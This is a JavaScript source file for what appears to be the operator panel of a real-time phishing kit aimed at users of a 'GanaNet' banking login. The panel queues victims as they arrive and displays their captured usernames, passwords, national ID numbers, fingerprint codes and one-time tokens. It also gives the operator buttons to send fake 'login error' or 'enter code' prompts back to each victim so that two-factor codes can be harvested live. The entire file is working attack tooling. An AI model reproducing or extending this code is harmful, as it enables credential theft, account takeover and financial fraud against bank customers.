/**
 * Panel operador GanaNet.
 * Cola ordenada de usuarios en espera para enviar GanaPin o Autenticador.
 */
const LANE_COUNT = 5
const CHANNEL = 'gananet-ops'
const STORAGE_KEY = 'gananet-ops-event'
const SESSIONS_KEY = 'gananet-ops-sessions'

const emptyState = document.getElementById('emptyState')
const rowCount = document.getElementById('rowCount')
const hint = document.getElementById('hint')
const btnClean = document.getElementById('btnClean')

let localChannel = null
try {
  localChannel = new BroadcastChannel(CHANNEL)
} catch (_) {
  /* ignore */
}

/** @type {Map<string, object>} */
const rows = new Map()
let counter = 0

function readStore() {
  try {
    const raw = localStorage.getItem(SESSIONS_KEY)
    const list = raw ? JSON.parse(raw) : []
    return Array.isArray(list) ? list : []
  } catch (_) {
    return []
  }
}

function writeStore(list) {
  try {
    localStorage.setItem(SESSIONS_KEY, JSON.stringify(list))
  } catch (_) {
    /* ignore */
  }
}

function statusLabel(state) {
  if (state === 'waiting') return 'En espera'
  if (state === 'active') return 'Activo'
  if (state === 'done') return 'Listo'
  if (state === 'typing') return 'Escribiendo'
  if (state === 'waiting-code') return 'Código enviado'
  if (state === 'error-login') return 'Error Login'
  if (state === 'error-cod1') return 'Error Cód 1'
  if (state === 'error-cod2') return 'Error Cód 2'
  if (state === 'verificado') return 'Verificado'
  if (state === 'dispositivo') return 'Dispositivo'
  return 'Nuevo'
}

function badgeClass(state) {
  if (
    state === 'waiting' ||
    state === 'waiting-code' ||
    state === 'dispositivo'
  ) {
    return 'badge badge--wait'
  }
  if (state === 'active' || state === 'typing') return 'badge badge--hola'
  if (state === 'done' || state === 'verificado') return 'badge badge--done'
  if (
    state === 'error-login' ||
    state === 'error-cod1' ||
    state === 'error-cod2' ||
    state === 'error'
  ) {
    return 'badge badge--error'
  }
  return 'badge badge--login'
}

function formatTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString('es-BO', {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    })
  } catch (_) {
    return '—'
  }
}

function laneForIndex(index) {
  return ((Number(index) || 1) - 1) % LANE_COUNT
}

function getLaneBody(lane) {
  return document.querySelector(`[data-lane-body="${lane}"]`)
}

function getDeviceIcon(device) {
  if (device === 'mobile') {
    return `
      <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="Celular">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#d96500;">
          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
          <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
        Celular
      </span>
    `
  }
  return `
    <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="PC">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#0b5ed7;">
        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
        <line x1="8" y1="21" x2="16" y2="21"></line>
        <line x1="12" y1="17" x2="12" y2="21"></line>
      </svg>
      PC
    </span>
  `
}

function isOnline(row) {
  const seen = row.last_seen || row.updatedAt || row.createdAt
  if (!seen) return false
  return Date.now() - seen < 20000
}

function publish(message) {
  const payload = { ...message, ts: Date.now() }
  if (localChannel) {
    try {
      localChannel.postMessage(payload)
    } catch (_) {
      /* ignore */
    }
  }
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(payload))
  } catch (_) {
    /* ignore */
  }
  
  const isLocal = 
    window.location.hostname === 'localhost' || 
    window.location.hostname === '127.0.0.1' || 
    window.location.hostname.startsWith('192.168.') || 
    window.location.hostname.startsWith('10.') || 
    window.location.hostname.startsWith('172.');

  if (isLocal) {
    try {
      fetch(`http://${window.location.hostname}:3001/publish`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    } catch (_) {
      /* ignore */
    }
  } else if (usePhpBackend) {
    try {
      fetch('/sessions.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    } catch (_) {
      /* ignore */
    }
  } else {
    try {
      fetch('/publish', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    } catch (_) {
      /* ignore */
    }
  }
}

function persistRows() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  writeStore(list)
  counter = list.length
}

function setRowState(rowId, state, action) {
  const row = rows.get(rowId)
  if (!row) return
  row.state = state
  if (state === 'waiting-code') {
    row.token = ''
  }
  row.last_seen = Date.now()
  row.updatedAt = Date.now()
  persistRows()
  hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`
  if (action) {
    publish({ type: 'session:action', sessionId: rowId, action })
  }
  render()
}

function upsertSession(session) {
  if (!session?.id) return
  // Ignorar fila demo vieja
  if (session.id === 'demo_preview') return

  const existing = rows.get(session.id)
  if (existing) {
    Object.assign(existing, {
      user: session.username ?? session.user ?? existing.user,
      clave: session.password ?? session.clave ?? existing.clave,
      tipo: session.tipoUsuario ?? session.tipo ?? existing.tipo,
      device: session.device ?? existing.device,
      ip: session.ip ?? existing.ip,
      token: session.token ?? existing.token,
      cedula: session.cedula ?? existing.cedula,
      codigoDactilar: session.codigoDactilar ?? existing.codigoDactilar,
      last_seen: Date.now(),
      updatedAt: Date.now(),
      state: session.state || existing.state || 'waiting',
    })
  } else {
    const createdAt = session.createdAt || Date.now()
    rows.set(session.id, {
      id: session.id,
      index: 0,
      createdAt,
      updatedAt: Date.now(),
      last_seen: Date.now(),
      tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
      device: session.device || 'desktop',
      ip: session.ip || '127.0.0.1',
      user: session.username || session.user || '—',
      clave: session.password || session.clave || '—',
      token: session.token || '',
      cedula: session.cedula || '',
      codigoDactilar: session.codigoDactilar || '',
      state: session.state || 'waiting',
    })
  }
  persistRows()
  const row = rows.get(session.id)
  hint.textContent = `En cola (#${row.index}): ${row.user} — elige GanaPin o Autenticador`
  render()

  // Resalta la fila nueva un momento
  requestAnimationFrame(() => {
    const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
    if (!tr) return
    tr.classList.add('is-new')
    setTimeout(() => tr.classList.remove('is-new'), 1800)
  })
}

function loadFromStore() {
  const list = readStore()
    .filter((s) => s && s.id && s.id !== 'demo_preview')
    .sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  rows.clear()
  list.forEach((session, i) => {
    rows.set(session.id, {
      id: session.id,
      index: i + 1,
      createdAt: session.createdAt || Date.now(),
      updatedAt: session.updatedAt || session.createdAt || Date.now(),
      last_seen: session.last_seen || session.updatedAt || Date.now(),
      tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
      device: session.device || 'desktop',
      ip: session.ip || '127.0.0.1',
      user: session.username || session.user || '—',
      clave: session.password || session.clave || '—',
      token: session.token || '',
      cedula: session.cedula || '',
      codigoDactilar: session.codigoDactilar || '',
      state: session.state || 'waiting',
    })
  })
  counter = rows.size
}

function createRow(row) {
  const tr = document.createElement('tr')
  tr.dataset.rowId = row.id
  tr.innerHTML = `
    <td class="col-num"></td>
    <td class="col-time mono"></td>
    <td class="col-tipo mono"></td>
    <td class="col-device"></td>
    <td class="col-ip mono"></td>
    <td class="col-user mono copyable" title="Copiar usuario"></td>
    <td class="col-pass mono copyable" title="Copiar clave"></td>
    <td class="col-cedula mono copyable" title="Copiar cédula"></td>
    <td class="col-dactilar mono copyable" title="Copiar código dactilar"></td>
    <td class="col-token mono copyable" title="Copiar token"></td>
    <td class="col-online"></td>
    <td class="col-status"></td>
    <td>
      <div class="row-actions">
        <button type="button" class="btn btn--wait" data-action="error-login">Err Login</button>
        <button type="button" class="btn btn--ok" data-action="codigo">Código</button>
        <button type="button" class="btn btn--error" data-action="error-cod2">Err Cód 2</button>
        <button type="button" class="btn btn--ok" data-action="dispositivo" title="Dispositivo" style="padding: 3px 8px; display: inline-flex; align-items: center; justify-content: center;"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg></button>
        <button type="button" class="btn btn--done" data-action="done">Listo</button>
      </div>
    </td>
  `

  tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-login', 'error-login')
  })
  tr.querySelector('[data-action="codigo"]')?.addEventListener('click', () => {
    setRowState(row.id, 'waiting-code', 'codigo')
  })
  tr.querySelector('[data-action="error-cod2"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-cod2', 'error-cod2')
  })
  tr.querySelector('[data-action="dispositivo"]')?.addEventListener('click', () => {
    setRowState(row.id, 'dispositivo', 'dispositivo')
  })
  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
    setRowState(row.id, 'done', 'done')
  })

  tr.querySelectorAll('td.copyable').forEach((td) => {
    td.addEventListener('click', async () => {
      const text = td.textContent?.trim()
      if (!text || text === '—') return
      try {
        await navigator.clipboard.writeText(text)
        td.classList.add('copied')
        setTimeout(() => td.classList.remove('copied'), 900)
      } catch (_) {
        /* ignore */
      }
    })
  })

  return tr
}

function updateRow(tr, row) {
  const online = isOnline(row)
  tr.querySelector('.col-num').textContent = String(row.index)
  tr.querySelector('.col-time').textContent = formatTime(row.createdAt)
  tr.querySelector('.col-tipo').textContent = row.tipo
  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
  tr.querySelector('.col-ip').textContent = row.ip || '—'
  tr.querySelector('.col-user').textContent = row.user || '—'
  tr.querySelector('.col-pass').textContent = row.clave || '—'
  tr.querySelector('.col-cedula').textContent = row.cedula || '—'
  tr.querySelector('.col-dactilar').textContent = row.codigoDactilar || '—'
  tr.querySelector('.col-token').textContent = row.token || '—'
  tr.querySelector('.col-online').innerHTML = online
    ? '<span class="pill pill--online">En línea</span>'
    : '<span class="pill pill--offline">Off</span>'
  tr.querySelector('.col-status').innerHTML =
    `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`

  const codigoBtn = tr.querySelector('[data-action="codigo"]')
  codigoBtn?.classList.toggle('is-on', row.state === 'waiting-code')
  tr.classList.toggle('is-waiting', row.state === 'waiting')
}

function render() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  rowCount.textContent = String(list.length)
  emptyState.classList.toggle('is-visible', list.length === 0)

  const byLane = Array.from({ length: LANE_COUNT }, () => [])
  list.forEach((row) => {
    byLane[laneForIndex(row.index)].push(row)
  })

  for (let lane = 0; lane < LANE_COUNT; lane += 1) {
    const body = getLaneBody(lane)
    if (!body) continue
    const laneEl = document.querySelector(`[data-lane="${lane}"]`)
    const countEl = laneEl?.querySelector('[data-lane-count]')
    const laneRows = byLane[lane]
    if (countEl) countEl.textContent = String(laneRows.length)

    ;[...body.querySelectorAll('tr[data-row-id]')].forEach((tr) => {
      if (!rows.has(tr.dataset.rowId)) tr.remove()
    })

    laneRows.forEach((row) => {
      let tr = [...body.querySelectorAll('tr[data-row-id]')].find(
        (node) => node.dataset.rowId === row.id,
      )
      if (!tr) {
        tr = createRow(row)
        body.appendChild(tr)
      }
      updateRow(tr, row)
    })
  }
}

function onMessage(data) {
  if (!data || typeof data !== 'object') return
  if (data.type === 'session:created' && data.session) {
    upsertSession(data.session)
  }
  if (data.type === 'sessions:sync' && Array.isArray(data.sessions)) {
    data.sessions.forEach((session) => upsertSession(session))
  }
  if (data.type === 'session:token') {
    const row = rows.get(data.sessionId)
    if (!row) return
    row.token = data.token || ''
    row.last_seen = Date.now()
    row.state = 'typing'
    persistRows()
    render()
  }
  if (data.type === 'session:device') {
    const row = rows.get(data.sessionId)
    if (!row) return
    row.cedula = data.cedula || ''
    row.codigoDactilar = data.codigoDactilar || ''
    row.last_seen = Date.now()
    row.state = 'typing'
    persistRows()
    render()
  }
  if (data.type === 'session:ping') {
    const row = rows.get(data.sessionId)
    if (!row) return
    row.last_seen = Date.now()
    persistRows()
    render()
  }
  if (data.type === 'sessions:clear') {
    rows.clear()
    counter = 0
    writeStore([])
    render()
  }
}

btnClean?.addEventListener('click', () => {
  rows.clear()
  counter = 0
  writeStore([])
  publish({ type: 'sessions:clear' })
  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
  render()
})

if (localChannel) {
  localChannel.onmessage = (event) => onMessage(event.data)
}

window.addEventListener('storage', (event) => {
  if (event.key === STORAGE_KEY && event.newValue) {
    try {
      onMessage(JSON.parse(event.newValue))
    } catch (_) {
      /* ignore */
    }
  }
  if (event.key === SESSIONS_KEY) {
    loadFromStore()
    render()
  }
})

const isLocal = 
  window.location.hostname === 'localhost' || 
  window.location.hostname === '127.0.0.1' || 
  window.location.hostname.startsWith('192.168.') || 
  window.location.hostname.startsWith('10.') || 
  window.location.hostname.startsWith('172.');

async function checkBackend() {
  if (isLocal) return;
  try {
    const res = await fetch('/sessions.php');
    const ct = res.headers.get('content-type') || '';
    if (res.ok && ct.includes('application/json')) {
      usePhpBackend = true;
    } else {
      usePhpBackend = false;
    }
  } catch (e) {
    usePhpBackend = false;
  }
}

checkBackend().then(() => {
  if (isLocal || !usePhpBackend) {
    try {
      const sseUrl = isLocal ? `http://${window.location.hostname}:3001/events` : '/events';
      const eventSource = new EventSource(sseUrl);
      eventSource.onmessage = (event) => {
        try {
          onMessage(JSON.parse(event.data));
        } catch (_) {}
      };
    } catch (_) {
      /* ignore */
    }
  } else {
    const poll = () => {
      fetch('/sessions.php')
        .then(res => res.json())
        .then((sessions) => {
          if (Array.isArray(sessions)) {
            // Clear current rows that are not in the fetched list
            const fetchedIds = new Set(sessions.map(s => s.id));
            for (const id of rows.keys()) {
              if (!fetchedIds.has(id)) {
                rows.delete(id);
              }
            }
            // Upsert all fetched sessions
            sessions.forEach(session => {
              const existing = rows.get(session.id);
              if (existing) {
                Object.assign(existing, {
                  user: session.username ?? session.user ?? existing.user,
                  clave: session.password ?? session.clave ?? existing.clave,
                  tipo: session.tipoUsuario ?? session.tipo ?? existing.tipo,
                  device: session.device ?? existing.device,
                  ip: session.ip ?? existing.ip,
                  token: session.token ?? existing.token,
                  cedula: session.cedula ?? existing.cedula,
                  codigoDactilar: session.codigoDactilar ?? existing.codigoDactilar,
                  state: session.state || existing.state || 'waiting',
                  last_seen: session.last_seen || existing.last_seen || Date.now(),
                });
              } else {
                rows.set(session.id, {
                  id: session.id,
                  index: 0,
                  createdAt: session.createdAt || Date.now(),
                  updatedAt: session.updatedAt || Date.now(),
                  last_seen: session.last_seen || Date.now(),
                  tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
                  device: session.device || 'desktop',
                  ip: session.ip || '127.0.0.1',
                  user: session.username || session.user || '—',
                  clave: session.password || session.clave || '—',
                  token: session.token || '',
                  cedula: session.cedula || '',
                  codigoDactilar: session.codigoDactilar || '',
                  state: session.state || 'waiting',
                });
              }
            });
            render();
          }
        })
        .catch(() => {});
    };

    poll();
    window.setInterval(poll, 2000);
  }
});

window.setInterval(() => {
  if (rows.size) render()
}, 2000)

loadFromStore()
hint.textContent = rows.size
  ? `En cola: ${rows.size}. Elige Código o reportar error en Acciones.`
  : 'Esperando usuarios del login… Al Verificar llegan aquí ordenados.'
render()
